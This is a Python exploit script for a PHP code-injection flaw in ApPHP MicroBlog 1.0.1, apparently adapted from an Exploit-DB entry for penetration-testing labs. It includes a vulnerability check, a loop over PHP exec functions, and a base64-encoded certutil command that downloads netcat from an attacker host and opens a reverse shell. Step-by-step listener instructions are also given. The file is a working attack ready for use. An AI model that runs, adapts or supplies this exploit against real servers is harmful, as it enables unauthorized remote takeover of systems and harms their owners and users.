#!/usr/bin/python3

"""
Author: Xtormin (Jennifer Torres)
Twitter: https://twitter.com/xtormin
Title:  ApPHP MicroBlog 1.0.1 (Free Version) - RCE
EBD-ID: EDB-ID-33030
Based on: https://www.exploit-db.com/exploits/33070
Usage example: python3 EDB-ID-33030.py -u http://10.11.1.223/index.php
"""
"""
1. Set up the listener:
nc -lvvp 443

2. Change the reverse shell in REV_SHELL variable and encode it in base64 (line 35):
certutil -urlcache -split -f http://192.168.119.215/nc.exe C:\Windows\Temp\nc.exe && C:\Windows\Temp\nc.exe -e cmd.exe 192.168.119.215 443

3. Execute the exploit:
python3 EDB-ID-33030.py -u http://10.11.1.223/index.php
"""

import requests
import argparse
import random
import urllib.request
import base64 
import sys
import re

"""
certutil -urlcache -split -f http://192.168.119.215/nc.exe C:\Windows\Temp\nc.exe && C:\Windows\Temp\nc.exe -e cmd.exe 192.168.119.215 443
"""
REV_SHELL = "Y2VydHV0aWwgLXVybGNhY2hlIC1zcGxpdCAtZiBodHRwOi8vMTkyLjE2OC4xMTkuMjE1L25jLmV4ZSBDOlxXaW5kb3dzXFRlbXBcbmMuZXhlICYmIEM6XFdpbmRvd3NcVGVtcFxuYy5leGUgLWUgY21kLmV4ZSAxOTIuMTY4LjExOS4yMTUgNDQz"

parser = argparse.ArgumentParser(add_help = True, description = '''
%(prog)s exploit for ApPHP MicroBlog 1.0.1 (Free Version) - Remote Code Execution ''')

parser.add_argument('-u','--url', 
                    help = 'Example: http://192.168.1.100:8000/index.php', 
                    nargs = '?', 
                    type=str, 
                    required=True)

def b64_encode(data):
    data_b64 = base64.b64encode(data.encode("ascii"))
    return data_b64.decode('ascii')

def random_string():
    return ''.join((random.choice('abcdfghhijklmnopqsxyzpqr') for i in range(15)))

def exec_req(url):
    r = urllib.request.urlopen(url)
    out = r.read()
    return out

def check_vuln(url):
    input_data = random_string()
    input_data_payload = b64_encode(input_data)

    # Add payload
    php_code = f"echo(base64_decode('{input_data_payload}')"
    payload = f"k);{php_code}=/"
    url_payload = f"{url}?{payload}"

    # Show data
    print(f"URL: {url}")
    print(f"URL with payload: {url_payload}")

    # Execute payload
    data = exec_req(url_payload).decode('utf-8')

    # Check vulnerability
    if not input_data in data:
        print ("\n[-] Not vulnerable :(")
        sys.exit()

    print ("\n[+] Vulnerable }8)")

def php_exec_code(url):
    start = random_string()
    end = random_string()
    php_exec_func = ["system", "passthru", "exec", "shell_exec"]

    for func in php_exec_func:
        # Delete the last ')' of the php original code
        code = REV_SHELL
        php_code = f"{func}(base64_decode('{code}')"
        payload = f"k);{php_code}=/"
        url_payload = f"{url}?{payload}"

        try : 
            print(f"\n|+| Trying reverse shell with {func}...")
            print(f"\n### Remember change the REV_SHELL variable in the code!")
            print(url_payload)

            # Execute payload
            data = exec_req(url_payload)
            print(data)

        except Exception as e:
            print("\n|-| Error executing code")
            print(e)



if __name__=="__main__":
    args = parser.parse_args()

    # Declare variables
    url = args.url

    check_vuln(url)
    php_exec_code(url)